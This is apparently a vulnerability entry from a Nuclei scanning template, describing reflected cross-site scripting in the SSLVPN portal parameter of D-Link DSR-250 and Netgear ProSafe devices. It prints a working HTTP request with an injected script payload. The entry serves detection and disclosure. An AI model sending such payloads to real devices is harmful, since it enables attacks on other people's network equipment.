# Vulnerability: Dlink DSR-250 and Netgear Prosafe - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`dlink-netgear-xss.yaml`)

## Description
Dlink DSR-250 and Netgear Prosafe are vulnerable to reflected cross site scripting endpoint scgi-bin/platform.cgi in parameter SSLVPN.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/scgi-bin/platform.cgi?page=portalLogin.htm&portal=SSLVPN"><script>alert(document.domain)</script>
```

